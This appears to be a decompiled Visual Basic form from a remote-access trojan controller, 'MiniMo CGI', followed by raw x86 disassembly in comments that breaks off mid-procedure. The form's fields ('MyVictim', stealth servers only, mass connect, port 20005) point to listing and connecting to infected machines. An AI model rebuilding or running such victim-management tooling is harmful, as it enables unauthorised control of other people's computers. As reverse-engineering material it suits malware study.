VERSION 5.00
Begin VB.Form frmCGI
  Caption = "MiniMo CGI"
  ScaleMode = 1
  WhatsThisButton = 0   'False
  BorderStyle = 3 'Fixed Dialog
  Icon = "frmCGI.frx":0
  LinkTopic = "Form2"
  MaxButton = 0   'False
  MinButton = 0   'False
  ClientLeft = 45
  ClientTop = 330
  ClientWidth = 6975
  ClientHeight = 4455
  BeginProperty Font
    Name = "Tahoma"
    Size = 8.25
    Charset = 0
    Weight = 400
    Underline = 0 'False
    Italic = 0 'False
    Strikethrough = 0 'False
  EndProperty
  ShowInTaskbar = 0   'False
  StartUpPosition = 2 'CenterScreen
  Begin MSComctlLib.ImageList ImageList2
  End
  Begin MSComctlLib.ImageList ImageList1
  End
  Begin MSComctlLib.Toolbar Toolbar1
    Left = 0
    Top = 0
    Width = 6975
    Height = 360
    TabIndex = 16
    Begin VB.TextBox txtTimeout
      Left = 4800
      Top = 30
      Width = 495
      Height = 285
      Text = "0.5"
      TabIndex = 18
      Alignment = 2 'Center
      ToolTipText = "This is the pause interval for mass connect"
    End
  End
  Begin VB.Frame Frame1
    Left = 0
    Top = 280
    Width = 6975
    Height = 3910
    TabIndex = 1
    BeginProperty Font
      Name = "MS Sans Serif"
      Size = 8.25
      Charset = 0
      Weight = 400
      Underline = 0 'False
      Italic = 0 'False
      Strikethrough = 0 'False
    EndProperty
    Begin VB.TextBox Text1
      Index = 4
      Left = 4920
      Top = 1890
      Width = 1935
      Height = 255
      Text = "1"
      TabIndex = 3
      MaxLength = 3
    End
    Begin VB.TextBox Text1
      Index = 3
      Left = 4920
      Top = 1620
      Width = 1935
      Height = 255
      Text = "20005"
      TabIndex = 5
      MaxLength = 5
    End
    Begin VB.TextBox Text1
      Index = 2
      Left = 4920
      Top = 1350
      Width = 1935
      Height = 255
      Text = "Blah"
      TabIndex = 7
      MaxLength = 255
    End
    Begin VB.TextBox Text1
      Index = 1
      Left = 4920
      Top = 1080
      Width = 1935
      Height = 255
      Text = "62.156."
      TabIndex = 8
      MaxLength = 15
    End
    Begin VB.TextBox Text1
      Index = 0
      Left = 4920
      Top = 810
      Width = 1935
      Height = 255
      Text = "MyVictim"
      TabIndex = 9
      MaxLength = 255
    End
    Begin VB.PictureBox picCGI
      ForeColor = &H80000005&
      Left = 60
      Top = 120
      Width = 255
      Height = 3740
      TabIndex = 17
      ScaleMode = 1
      'Unknown = 0   'False
      BorderStyle = 0 'None
      BeginProperty Font
        Name = "Arial"
        Size = 9.75
        Charset = 0
        Weight = 700
        Underline = 0 'False
        Italic = 0 'False
        Strikethrough = 0 'False
      EndProperty
    End
    Begin VB.ListBox lstServers
      BackColor = &HFFFFFF&
      ForeColor = &H0&
      Left = 360
      Top = 240
      Width = 2175
      Height = 3570
      TabIndex = 15
    End
    Begin VB.TextBox txtDetails
      BackColor = &HFFFFFF&
      ForeColor = &H0&
      Left = 2640
      Top = 2280
      Width = 4215
      Height = 1520
      Text = "How to use this list:\n\n1) Select the filter options\n2) Click the ""Get list""-button\n3) Wait until all servers are listed (a few seconds)\n4) Click a server to see additional info\n5) Doubleclick a server to connect to it\n"
      TabIndex = 14
      MultiLine = -1  'True
      ScrollBars = 2
      Locked = -1  'True
    End
    Begin VB.CheckBox Check1
      Caption = "Hide password-protected servers"
      Index = 0
      Left = 2700
      Top = 300
      Width = 3285
      Height = 195
      TabIndex = 13
    End
    Begin VB.CheckBox Check1
      Caption = "Nickname must contain:"
      Index = 1
      Left = 2700
      Top = 840
      Width = 2415
      Height = 195
      TabIndex = 12
    End
    Begin VB.CheckBox Check1
      Caption = "IP address must contain:"
      Index = 2
      Left = 2700
      Top = 1110
      Width = 2415
      Height = 195
      TabIndex = 11
    End
    Begin VB.CheckBox Check1
      Caption = "Description must contain:"
      Index = 3
      Left = 2700
      Top = 1380
      Width = 2355
      Height = 195
      TabIndex = 10
    End
    Begin VB.CheckBox Check1
      Caption = "Show stealth (invisible) servers only"
      Index = 4
      Left = 2700
      Top = 570
      Width = 3225
      Height = 195
      TabIndex = 6
    End
    Begin VB.CheckBox Check1
      Caption = "Port must be:"
      Index = 5
      Left = 2700
      Top = 1650
      Width = 1995
      Height = 195
      TabIndex = 4
    End
    Begin VB.CheckBox Check1
      Caption = "Countrycode must be:"
      Index = 6
      Left = 2700
      Top = 1920
      Width = 2205
      Height = 195
      TabIndex = 2
    End
  End
  Begin MSWinsockLib.Winsock Sock
  End
  Begin MSComctlLib.StatusBar StatusBar1
    Left = 0
    Top = 4200
    Width = 6975
    Height = 255
    TabIndex = 0
  End
End

Attribute VB_Name = "frmCGI"

Private Sub Form__501540
  '00501540: push ebp
  '00501541: mov ebp, esp
  '00501543: sub esp, 0000000Ch
  '00501546: push 004081B6h
  '0050154B: mov eax, fs:[00h]
  '00501551: push eax
  '00501552: mov fs:[00000000h], esp
  '00501559: sub esp, 00000050h
  '0050155C: push ebx
  '0050155D: push esi
  '0050155E: push edi
  '0050155F: mov [ebp-0Ch], esp
  '00501562: mov [ebp-08h], 00405F20h
  '00501569: mov ebx, [ebp+08h]
  '0050156C: mov eax, ebx
  '0050156E: and eax, 00000001h
  '00501571: mov [ebp-04h], eax
  '00501574: and ebx, FFFFFFFEh
  '00501577: push ebx
  '00501578: mov [ebp+08h], ebx
  '0050157B: mov ecx, [ebx]
  '0050157D: call [ecx+04h]
  '00501580: xor edi, edi
  '00501582: push 00408DD8h
  '00501587: mov [ebp-18h], edi
  '0050158A: mov [ebp-1Ch], edi
  '0050158D: mov [ebp-20h], edi
  '00501590: mov [ebp-2Ch], edi
  '00501593: mov [ebp-30h], edi
  '00501596: mov [ebp-40h], edi
  '00501599: mov [ebp-44h], edi
  '0050159C: mov [ebp-50h], edi
  '0050159F: mov [ebp-54h], edi
  '005015A2: call [00401200h]
  '005015A8: lea edx, [ebp-30h]
  '005015AB: push eax
  '005015AC: push edx
  '005015AD: call [004010E4h]
  '005015B3: push eax
  '005015B4: lea eax, [ebx+34h]
  '005015B7: push eax
  '005015B8: call [004010F8h]
  '005015BE: lea ecx, [ebp-30h]
  '005015C1: call [004013B8h]
  '005015C7: mov eax, [ebx+38h]
  '005015CA: lea esi, [ebx+38h]
  '005015CD: cmp eax, edi
  '005015CF: jnz 5015DDh
  '005015D1: push esi
  '005015D2: push 00408F5Ch
  '005015D7: call [004012B8h]
  '005015DD: mov ecx, [ebx]
  '005015DF: mov edi, [esi]
  '005015E1: push ebx
  '005015E2: call [ecx+00000308h]
  '005015E8: lea edx, [ebp-30h]
  '005015EB: push eax
  '005015EC: push edx
  '005015ED: call [004010E4h]
  '005015F3: mov eax, [edi]
  '005015F5: lea ecx, [ebp-30h]
  '005015F8: push ecx
  '005015F9: push edi
  '005015FA: call [eax+24h]
  '005015FD: test eax, eax
  '005015FF: fclex 
  '00501601: jnl 501612h
  '00501603: push 00000024h
  '00501605: push 004209FCh
  '0050160A: push edi
  '0050160B: push eax
  '0050160C: call [004010A0h]
  '00501612: lea ecx, [ebp-30h]
  '00501615: call [004013B8h]
  '0050161B: cmp [esi], 00000000h
  '0050161E: jnz 50162Ch
  '00501620: push esi
  '00501621: push 00408F5Ch
  '00501626: call [004012B8h]
  '0050162C: mov edi, [esi]
  '0050162E: push 00428A38h
  '00501633: push edi
  '00501634: mov edx, [edi]
  '00501636: call [edx+1Ch]
  '00501639: test eax, eax
  '0050163B: fclex 
  '0050163D: jnl 50164Eh
  '0050163F: push 0000001Ch
  '00501641: push 004209FCh
  '00501646: push edi
  '00501647: push eax
  '00501648: call [004010A0h]
  '0050164E: cmp [esi], 00000000h
  '00501651: jnz 50165Fh
  '00501653: push esi
  '00501654: push 00408F5Ch
  '00501659: call [004012B8h]
  '0050165F: mov edi, [esi]
  '00501661: push 80000012h
  '00501666: push edi
  '00501667: mov eax, [edi]
  '00501669: call [eax+2Ch]
  '0050166C: test eax, eax
  '0050166E: fclex 
  '00501670: jnl 501681h
  '00501672: push 0000002Ch
  '00501674: push 004209FCh
  '00501679: push edi
  '0050167A: push eax
  '0050167B: call [004010A0h]
  '00501681: cmp [esi], 00000000h
  '00501684: jnz 501692h
  '00501686: push esi
  '00501687: push 00408F5Ch
  '0050168C: call [004012B8h]
  '00501692: mov esi, [esi]
  '00501694: push 8000000Fh
  '00501699: push esi
  '0050169A: mov ecx, [esi]
  '0050169C: call [ecx+34h]
  '0050169F: test eax, eax
  '005016A1: fclex 
  '005016A3: jnl 5016B4h
  '005016A5: push 00000034h
  '005016A7: push 004209FCh
  '005016AC: push esi
  '005016AD: push eax
  '005016AE: call [004010A0h]
  '005016B4: call [00401104h]
  '005016BA: mov edx, [ebx]
  '005016BC: lea eax, [ebp-30h]
  '005016BF: push eax
  '005016C0: push ebx
  '005016C1: call [edx+00000218h]
  '005016C7: test eax, eax
  '005016C9: fclex 
  '005016CB: jnl 5016DFh
  '005016CD: push 00000218h
  '005016D2: push 00422CA4h
  '005016D7: push ebx
  '005016D8: push eax
  '005016D9: call [004010A0h]
  '005016DF: mov eax, [ebp-30h]
  '005016E2: lea ecx, [ebp-50h]
  '005016E5: push eax
  '005016E6: push ecx
  '005016E7: mov [ebp-30h], 00000000h
  '005016EE: call [004010E4h]
  '005016F4: push eax
  '005016F5: lea edx, [ebp-1Ch]
  '005016F8: lea eax, [ebp-54h]
  '005016FB: push edx
  '005016FC: push eax
  '005016FD: push 0041F304h
  '00501702: call [004010CCh]
  '00501708: mov esi, [00401278h]
  '0050170E: test eax, eax
  '00501710: jz 005017BDh
  '00501716: mov ecx, [ebp-1Ch]
  '00501719: push 0041E3FCh
  '0050171E: push ecx
  '0050171F: call esi
  '00501721: mov edx, [ebp-1Ch]
  '00501724: mov di, ax
  '00501727: neg di
  '0050172A: sbb edi, edi
  '0050172C: push 00420F60h
  '00501731: push edx
  '00501732: inc edi
  '00501733: call esi
  '00501735: neg ax
  '00501738: sbb eax, eax
  '0050173A: push 0041FB8Ch
  '0050173F: inc eax
  '00501740: and edi, eax
  '00501742: mov eax, [ebp-1Ch]
  '00501745: neg edi
  '00501747: sbb edi, edi
  '00501749: push eax
  '0050174A: neg edi
  '0050174C: call esi
  '0050174E: neg ax
  '00501751: mov ecx, [ebp-1Ch]
  '00501754: push 0041CE08h
  '00501759: sbb eax, eax
  '0050175B: push ecx
  '0050175C: inc eax
  '0050175D: and edi, eax
  '0050175F: neg edi
  '00501761: sbb edi, edi
  '00501763: neg edi
  '00501765: call esi
  '00501767: neg ax
  '0050176A: sbb eax, eax
  '0050176C: inc eax
  '0050176D: test edi, eax
  '0050176F: jnz 5017A5h
  '00501771: mov edx, [ebp-1Ch]
  '00501774: push 00000000h
  '00501776: push 00420F70h
  '0050177B: lea eax, [ebp-40h]
  '0050177E: push edx
  '0050177F: push eax
  '00501780: call [00401368h]
  '00501786: add esp, 00000010h
  '00501789: push eax
  '0050178A: call [0040130Ch]
  '00501790: lea ecx, [ebp-44h]
  '00501793: mov [ebp-44h], eax
  '00501796: push ecx
  '00501797: call 004EB0B0h
  '0050179C: lea ecx, [ebp-40h]
  '0050179F: call [00401030h]
  '005017A5: lea edx, [ebp-1Ch]
  '005017A8: lea eax, [ebp-54h]
  '005017AB: push edx
  '005017AC: push eax
  '005017AD: push 0041F304h
  '005017B2: call [00401150h]
  '005017B8: jmp 0050170Eh
  '005017BD: mov ecx, [ebx]
  '005017BF: push ebx
  '005017C0: call [ecx+000006F8h]
  '005017C6: test eax, eax
  '005017C8: jnl 5017DCh
  '005017CA: push 000006F8h
  '005017CF: push 00422CD4h
  '005017D4: push ebx
  '005017D5: push eax
  '005017D6: call [004010A0h]
  '005017DC: mov [ebp-04h], 00000000h
  '005017E3: push 00501836h
  '005017E8: jmp 5017FDh
  '005017EA: lea ecx, [ebp-30h]
  '005017ED: call [004013B8h]
  '005017F3: lea ecx, [ebp-40h]
  '005017F6: call [00401030h]
  '005017FC: ret 
End Sub
Private Sub Form__501980
  '00501980: push ebp
  '00501981: mov ebp, esp
  '00501983: sub esp, 00000018h
  '00501986: push 004081B6h
  '0050198B: mov eax, fs:[00h]
  '00501991: push eax
  '00501992: mov fs:[00000000h], esp
  '00501999: mov eax, 00000014h
  '0050199E: call 004081B0h
  '005019A3: push ebx
  '005019A4: push esi
  '005019A5: push edi
  '005019A6: mov [ebp-18h], esp
  '005019A9: mov [ebp-14h], 00405F40h
  '005019B0: mov eax, [ebp+08h]
  '005019B3: and eax, 00000001h
  '005019B6: mov [ebp-10h], eax
  '005019B9: mov ecx, [ebp+08h]
  '005019BC: and ecx, FFFFFFFEh
  '005019BF: mov [ebp+08h], ecx
  '005019C2: mov [ebp-0Ch], 00000000h
  '005019C9: mov edx, [ebp+08h]
  '005019CC: mov eax, [edx]
  '005019CE: mov ecx, [ebp+08h]
  '005019D1: push ecx
  '005019D2: call [eax+04h]
  '005019D5: mov [ebp-04h], 00000001h
  '005019DC: mov [ebp-04h], 00000002h
  '005019E3: push FFFFFFFFh
  '005019E5: call [004010E8h]
  '005019EB: mov [ebp-10h], 00000000h
  '005019F2: mov edx, [ebp+08h]
  '005019F5: mov eax, [edx]
  '005019F7: mov ecx, [ebp+08h]
  '005019FA: push ecx
  '005019FB: call [eax+08h]
  '005019FE: mov eax, [ebp-10h]
  '00501A01: mov ecx, [ebp-20h]
  '00501A04: mov fs:[00000000h], ecx
  '00501A0B: pop edi
  '00501A0C: pop esi
  '00501A0D: pop ebx
  '00501A0E: mov esp, ebp
  '00501A10: pop ebp
  '00501A11: retn 0004h
End Sub
Private Sub Form__501860
  '00501860: push ebp
  '00501861: mov ebp, esp
  '00501863: sub esp, 0000000Ch
  '00501866: push 004081B6h
  '0050186B: mov eax, fs:[00h]
  '00501871: push eax
  '00501872: mov fs:[00000000h], esp
  '00501879: sub esp, 00000020h
  '0050187C: push ebx
  '0050187D: push esi
  '0050187E: push edi
  '0050187F: mov [ebp-0Ch], esp
  '00501882: mov [ebp-08h], 00405F30h
  '00501889: mov edi, [ebp+08h]
  '0050188C: mov eax, edi
  '0050188E: and eax, 00000001h
  '00501891: mov [ebp-04h], eax
  '00501894: and edi, FFFFFFFEh
  '00501897: push edi
  '00501898: mov [ebp+08h], edi
  '0050189B: mov ecx, [edi]
  '0050189D: call [ecx+04h]
  '005018A0: mov edx, [edi]
  '005018A2: xor eax, eax
  '005018A4: push eax
  '005018A5: push 00000008h
  '005018A7: push edi
  '005018A8: mov [ebp-18h], eax
  '005018AB: mov [ebp-28h], eax
  '005018AE: call [edx+00000324h]
  '005018B4: mov ebx, [004010E4h]
  '005018BA: push eax
  '005018BB: lea eax, [ebp-18h]
  '005018BE: push eax
  '005018BF: call ebx
  '005018C1: lea ecx, [ebp-28h]
  '005018C4: push eax
  '005018C5: push ecx
  '005018C6: call [004011E4h]
  '005018CC: add esp, 00000010h
  '005018CF: push eax
  '005018D0: call [00401284h]
  '005018D6: mov si, ax
  '005018D9: lea ecx, [ebp-18h]
  '005018DC: neg si
  '005018DF: sbb esi, esi
  '005018E1: neg esi
  '005018E3: neg esi
  '005018E5: call [004013B8h]
  '005018EB: lea ecx, [ebp-28h]
  '005018EE: call [00401030h]
  '005018F4: test si, si
  '005018F7: jz 501920h
  '005018F9: mov edx, [edi]
  '005018FB: push 00000000h
  '005018FD: push 00000046h
  '005018FF: push edi
  '00501900: call [edx+00000324h]
  '00501906: push eax
  '00501907: lea eax, [ebp-18h]
  '0050190A: push eax
  '0050190B: call ebx
  '0050190D: push eax
  '0050190E: call [00401040h]
  '00501914: add esp, 0000000Ch
  '00501917: lea ecx, [ebp-18h]
  '0050191A: call [004013B8h]
  '00501920: mov ecx, [edi]
  '00501922: push edi
  '00501923: call [ecx+000006FCh]
  '00501929: test eax, eax
  '0050192B: jnl 50193Fh
  '0050192D: push 000006FCh
  '00501932: push 00422CD4h
  '00501937: push edi
  '00501938: push eax
  '00501939: call [004010A0h]
  '0050193F: mov [ebp-04h], 00000000h
  '00501946: push 00501961h
  '0050194B: jmp 501960h
  '0050194D: lea ecx, [ebp-18h]
  '00501950: call [004013B8h]
  '00501956: lea ecx, [ebp-28h]
  '00501959: call [00401030h]
  '0050195F: ret 
End Sub
Private Sub Toolbar1__504750
  '00504750: push ebp
  '00504751: mov ebp, esp
  '00504753: sub esp, 0000000Ch
  '00504756: push 004081B6h
  '0050475B: mov eax, fs:[00h]
  '00504761: push eax
  '00504762: mov fs:[00000000h], esp
  '00504769: sub esp, 000000ECh
  '0050476F: push ebx
  '00504770: push esi
  '00504771: push edi
  '00504772: mov [ebp-0Ch], esp
  '00504775: mov [ebp-08h], 00406070h
  '0050477C: mov esi, [ebp+08h]
  '0050477F: mov eax, esi
  '00504781: and eax, 00000001h
  '00504784: mov [ebp-04h], eax
  '00504787: and esi, FFFFFFFEh
  '0050478A: push esi
  '0050478B: mov [ebp+08h], esi
  '0050478E: mov ecx, [esi]
  '00504790: call [ecx+04h]
  '00504793: mov edx, [ebp+0Ch]
  '00504796: lea eax, [ebp-24h]
  '00504799: xor edi, edi
  '0050479B: push edx
  '0050479C: push eax
  '0050479D: mov [ebp-24h], edi
  '005047A0: mov [ebp-28h], edi
  '005047A3: mov [ebp-2Ch], edi
  '005047A6: mov [ebp-30h], edi
  '005047A9: mov [ebp-34h], edi
  '005047AC: mov [ebp-38h], edi
  '005047AF: mov [ebp-48h], edi
  '005047B2: mov [ebp-58h], edi
  '005047B5: mov [ebp-68h], edi
  '005047B8: mov [ebp-78h], edi
  '005047BB: mov [ebp-00000088h], edi
  '005047C1: mov [ebp-00000098h], edi
  '005047C7: mov [ebp-000000BCh], edi
  '005047CD: mov [ebp-000000D0h], edi
  '005047D3: call [004010F8h]
  '005047D9: mov eax, [ebp-24h]
  '005047DC: lea edx, [ebp-28h]
  '005047DF: push edx
  '005047E0: push eax
  '005047E1: mov ecx, [eax]
  '005047E3: call [ecx+24h]
  '005047E6: cmp eax, edi
  '005047E8: fclex 
  '005047EA: jnl 5047FEh
  '005047EC: mov ecx, [ebp-24h]
  '005047EF: push 00000024h
  '005047F1: push 0041C048h
  '005047F6: push ecx
  '005047F7: push eax
  '005047F8: call [004010A0h]
  '005047FE: mov eax, [ebp-28h]
  '00504801: lea edx, [ebp-48h]
  '00504804: mov [ebp-40h], eax
  '00504807: lea eax, [ebp-58h]
  '0050480A: push edx
  '0050480B: push eax
  '0050480C: mov [ebp-28h], edi
  '0050480F: mov [ebp-48h], 00000008h
  '00504816: call [00401174h]
  '0050481C: lea ecx, [ebp-58h]
  '0050481F: lea edx, [ebp-00000088h]
  '00504825: push ecx
  '00504826: push edx
  '00504827: mov [ebp-80h], 00428370h
  '0050482E: mov [ebp-00000088h], 00008008h
  '00504838: call [00401198h]
  '0050483E: mov bx, ax
  '00504841: lea eax, [ebp-58h]
  '00504844: lea ecx, [ebp-48h]
  '00504847: push eax
  '00504848: push ecx
  '00504849: push 00000002h
  '0050484B: call [00401050h]
  '00504851: add esp, 0000000Ch
  '00504854: cmp bx, di
  '00504857: jz 00504B55h
  '0050485D: mov edx, [esi]
  '0050485F: push esi
  '00504860: call [edx+0000030Ch]
  '00504866: push eax
  '00504867: lea eax, [ebp-38h]
  '0050486A: push eax
  '0050486B: call [004010E4h]
  '00504871: mov ebx, eax
  '00504873: lea edx, [ebp-28h]
  '00504876: push edx
  '00504877: push ebx
  '00504878: mov ecx, [ebx]
  '0050487A: call [ecx+000000F8h]
  '00504880: cmp eax, edi
  '00504882: fclex 
  '00504884: jnl 504898h
  '00504886: push 000000F8h
  '0050488B: push 0041FB8Ch
  '00504890: push ebx
  '00504891: push eax
  '00504892: call [004010A0h]
  '00504898: mov eax, [ebp-28h]
  '0050489B: lea ecx, [ebp-58h]
  '0050489E: mov [ebp-40h], eax
  '005048A1: lea eax, [ebp-48h]
  '005048A4: mov ebx, 00000008h
  '005048A9: push eax
  '005048AA: push ecx
  '005048AB: mov [ebp-28h], edi
  '005048AE: mov [ebp-48h], ebx
  '005048B1: call [00401074h]
  '005048B7: lea edx, [ebp-58h]
  '005048BA: push 00000001h
  '005048BC: lea eax, [ebp-00000088h]
  '005048C2: push edx
  '005048C3: push eax
  '005048C4: lea ecx, [ebp-68h]
  '005048C7: push edi
  '005048C8: push ecx
  '005048C9: mov [ebp-80h], 00428A54h
  '005048D0: mov [ebp-00000088h], ebx
  '005048D6: mov [ebp-00000090h], edi
  '005048DC: mov [ebp-00000098h], 00008002h
  '005048E6: call [00401260h]
  '005048EC: lea edx, [ebp-00000098h]
  '005048F2: push eax
  '005048F3: push edx
  '005048F4: call [00401308h]
  '005048FA: lea ecx, [ebp-38h]
  '005048FD: mov bx, ax
  '00504900: call [004013B8h]
  '00504906: lea eax, [ebp-68h]
  '00504909: lea ecx, [ebp-58h]
  '0050490C: push eax
  '0050490D: lea edx, [ebp-48h]
  '00504910: push ecx
  '00504911: push edx
  '00504912: push 00000003h
  '00504914: call [00401050h]
  '0050491A: add esp, 00000010h
  '0050491D: cmp bx, di
  '00504920: jnz 00504CBFh
  '00504926: cmp [00541200h], edi
  '0050492C: jnz 50493Eh
  '0050492E: push 00541200h
  '00504933: push 0040B670h
  '00504938: call [004012B8h]
  '0050493E: sub esp, 00000010h
  '00504941: mov eax, 0000000Ah
  '00504946: mov edx, esp
  '00504948: mov [ebp-00000098h], eax
  '0050494E: mov [ebp-00000088h], eax
  '00504954: mov ecx, 80020004h
  '00504959: mov [edx], eax
  '0050495B: mov eax, [ebp-00000094h]
  '00504961: mov [ebp-00000090h], ecx
  '00504967: sub esp, 00000010h
  '0050496A: mov [edx+04h], eax
  '0050496D: mov eax, [ebp-00000090h]
  '00504973: mov ebx, [00541200h]
  '00504979: mov [ebp-80h], ecx
  '0050497C: mov [edx+08h], eax
  '0050497F: mov eax, [ebp-0000008Ch]
  '00504985: mov ecx, [ebx]
  '00504987: mov [edx+0Ch], eax
  '0050498A: mov eax, [ebp-00000088h]
  '00504990: mov edx, esp
  '00504992: push ebx
  '00504993: mov [edx], eax
  '00504995: mov eax, [ebp-00000084h]
  '0050499B: mov [edx+04h], eax
  '0050499E: mov eax, [ebp-80h]
  '005049A1: mov [edx+08h], eax
  '005049A4: mov eax, [ebp-7Ch]
  '005049A7: mov [edx+0Ch], eax
  '005049AA: call [ecx+000002B0h]
  '005049B0: cmp eax, edi
  '005049B2: fclex 
  '005049B4: jnl 5049C8h
  '005049B6: push 000002B0h
  '005049BB: push 00422F24h
  '005049C0: push ebx
  '005049C1: push eax
  '005049C2: call [004010A0h]
  '005049C8: call [00401104h]
  '005049CE: mov ecx, [esi]
  '005049D0: push esi
  '005049D1: call [ecx+0000030Ch]
  '005049D7: lea edx, [ebp-38h]
  '005049DA: push eax
  '005049DB: push edx
  '005049DC: call [004010E4h]
  '005049E2: mov ebx, eax
  '005049E4: lea ecx, [ebp-000000BCh]
  '005049EA: push ecx
  '005049EB: push ebx
  '005049EC: mov eax, [ebx]
  '005049EE: call [eax+000000D8h]
  '005049F4: cmp eax, edi
  '005049F6: fclex 
  '005049F8: jnl 504A0Ch
  '005049FA: push 000000D8h
  '005049FF: push 0041FB8Ch
  '00504A04: push ebx
  '00504A05: push eax
  '00504A06: call [004010A0h]
  '00504A0C: mov dx, [ebp-000000BCh]
  '00504A13: lea ecx, [ebp-38h]
  '00504A16: sub dx, 0001h
  '00504A1A: jo 00505001h
  '00504A20: movsx eax, dx
  '00504A23: mov [ebp-000000D8h], eax
  '00504A29: xor ebx, ebx
  '00504A2B: call [004013B8h]
  '00504A31: cmp ebx, [ebp-000000D8h]
  '00504A37: jnle 00504CBFh
  '00504A3D: mov ecx, [esi+34h]
  '00504A40: lea edx, [ebp-28h]
  '00504A43: push edx
  '00504A44: mov edi, [ecx]
  '00504A46: mov ecx, ebx
  '00504A48: add ecx, 00000001h
  '00504A4B: jo 00505001h
  '00504A51: call [004011A8h]
  '00504A57: push eax
  '00504A58: mov eax, [esi+34h]
  '00504A5B: push eax
  '00504A5C: call [edi+20h]
  '00504A5F: test eax, eax
  '00504A61: fclex 
  '00504A63: jnl 504A77h
  '00504A65: mov ecx, [esi+34h]
  '00504A68: push 00000020h
  '00504A6A: push 004289C8h
  '00504A6F: push ecx
  '00504A70: push eax
  '00504A71: call [004010A0h]
  '00504A77: mov edx, [esi+34h]
  '00504A7A: mov ecx, ebx
  '00504A7C: lea eax, [ebp-2Ch]
  '00504A7F: add ecx, 00000001h
  '00504A82: mov edi, [edx]
  '00504A84: push eax
  '00504A85: jo 00505001h
  '00504A8B: call [004011A8h]
  '00504A91: mov ecx, [esi+34h]
  '00504A94: push eax
  '00504A95: push ecx
  '00504A96: call [edi+24h]
  '00504A99: test eax, eax
  '00504A9B: fclex 
  '00504A9D: jnl 504AB1h
  '00504A9F: mov edx, [esi+34h]
  '00504AA2: push 00000024h
  '00504AA4: push 004289C8h
  '00504AA9: push edx
  '00504AAA: push eax
  '00504AAB: call [004010A0h]
  '00504AB1: mov eax, [541200h]
  '00504AB6: test eax, eax
  '00504AB8: jnz 504ACAh
  '00504ABA: push 00541200h
  '00504ABF: push 0040B670h
  '00504AC4: call [004012B8h]
  '00504ACA: mov edx, [ebp-2Ch]
  '00504ACD: mov edi, [00541200h]
  '00504AD3: lea ecx, [ebp-34h]
  '00504AD6: mov [ebp-2Ch], 00000000h
  '00504ADD: call [00401378h]
  '00504AE3: mov edx, [ebp-28h]
  '00504AE6: lea ecx, [ebp-30h]
  '00504AE9: mov [ebp-28h], 00000000h
  '00504AF0: call [00401378h]
  '00504AF6: mov eax, [edi]
  '00504AF8: lea ecx, [ebp-48h]
  '00504AFB: push ecx
  '00504AFC: lea edx, [ebp-34h]
  '00504AFF: lea ecx, [ebp-30h]
  '00504B02: push edx
  '00504B03: push ecx
  '00504B04: push edi
  '00504B05: call [eax+000006F8h]
  '00504B0B: test eax, eax
  '00504B0D: fclex 
  '00504B0F: jnl 504B23h
  '00504B11: push 000006F8h
  '00504B16: push 00422D74h
  '00504B1B: push edi
  '00504B1C: push eax
  '00504B1D: call [004010A0h]
  '00504B23: lea edx, [ebp-34h]
  '00504B26: lea eax, [ebp-30h]
  '00504B29: push edx
  '00504B2A: push eax
  '00504B2B: push 00000002h
  '00504B2D: call [004012E8h]
  '00504B33: add esp, 0000000Ch
  '00504B36: lea ecx, [ebp-48h]
  '00504B39: call [00401030h]
  '00504B3F: mov eax, 00000001h
  '00504B44: add eax, ebx
  '00504B46: jo 00505001h
  '00504B4C: mov ebx, eax
  '00504B4E: xor edi, edi
  '00504B50: jmp 00504A31h
  '00504B55: mov eax, [ebp-24h]
  '00504B58: lea edx, [ebp-28h]
  '00504B5B: push edx
  '00504B5C: push eax
  '00504B5D: mov ecx, [eax]
  '00504B5F: call [ecx+24h]
  '00504B62: cmp eax, edi
  '00504B64: fclex 
  '00504B66: jnl 504B7Ah
  '00504B68: mov ecx, [ebp-24h]
  '00504B6B: push 00000024h
  '00504B6D: push 0041C048h
  '00504B72: push ecx
  '00504B73: push eax
  '00504B74: call [004010A0h]
  '00504B7A: mov eax, [ebp-28h]
  '00504B7D: lea edx, [ebp-48h]
  '00504B80: mov [ebp-40h], eax
  '00504B83: lea eax, [ebp-58h]
  '00504B86: push edx
  '00504B87: push eax
  '00504B88: mov [ebp-28h], edi
  '00504B8B: mov [ebp-48h], 00000008h
  '00504B92: call [00401174h]
  '00504B98: lea ecx, [ebp-58h]
  '00504B9B: lea edx, [ebp-00000088h]
  '00504BA1: push ecx
  '00504BA2: push edx
  '00504BA3: mov [ebp-80h], 0042832Ch
  '00504BAA: mov [ebp-00000088h], 00008008h
  '00504BB4: call [00401198h]
  '00504BBA: mov bx, ax
  '00504BBD: lea eax, [ebp-58h]
  '00504BC0: lea ecx, [ebp-48h]
  '00504BC3: push eax
  '00504BC4: push ecx
  '00504BC5: push 00000002h
  '00504BC7: call [00401050h]
  '00504BCD: add esp, 0000000Ch
  '00504BD0: cmp bx, di
  '00504BD3: jz 00504CBFh
  '00504BD9: mov edx, [esi]
  '00504BDB: push esi
  '00504BDC: call [edx+0000030Ch]
  '00504BE2: push eax
  '00504BE3: lea eax, [ebp-38h]
  '00504BE6: push eax
  '00504BE7: call [004010E4h]
  '00504BED: mov ebx, eax
  '00504BEF: lea edx, [ebp-000000BCh]
  '00504BF5: push edx
  '00504BF6: push ebx
  '00504BF7: mov ecx, [ebx]
  '00504BF9: call [ecx+000000D8h]
  '00504BFF: cmp eax, edi
  '00504C01: fclex 
  '00504C03: jnl 504C17h
  '00504C05: push 000000D8h
  '00504C0A: push 0041FB8Ch
  '00504C0F: push ebx
  '00504C10: push eax
  '00504C11: call [004010A0h]
  '00504C17: xor ebx, ebx
  '00504C19: cmp word ptr [ebp-000000BCh], 0001h
  '00504C21: lea ecx, [ebp-38h]
  '00504C24: setl bl
  '00504C27: neg ebx
  '00504C29: call [004013B8h]
  '00504C2F: cmp bx, di
  '00504C32: jz 00504CCDh
  '00504C38: mov esi, [00401338h]
  '00504C3E: mov ecx, 80020004h
  '00504C43: mov [ebp-70h], ecx
  '00504C46: mov eax, 0000000Ah
  '00504C4B: mov [ebp-60h], ecx
  '00504C4E: mov ebx, 00000008h
  '00504C53: lea edx, [ebp-00000098h]
  '00504C59: lea ecx, [ebp-58h]
  '00504C5C: mov [ebp-78h], eax
  '00504C5F: mov [ebp-68h], eax
  '00504C62: mov [ebp-00000090h], 00428B9Ch
  '00504C6C: mov [ebp-00000098h], ebx
  '00504C72: call esi
  '00504C74: lea edx, [ebp-00000088h]
  '00504C7A: lea ecx, [ebp-48h]
  '00504C7D: mov [ebp-80h], 00428D64h
  '00504C84: mov [ebp-00000088h], ebx
  '00504C8A: call esi
  '00504C8C: lea eax, [ebp-78h]
  '00504C8F: lea ecx, [ebp-68h]
  '00504C92: push eax
  '00504C93: lea edx, [ebp-58h]
  '00504C96: push ecx
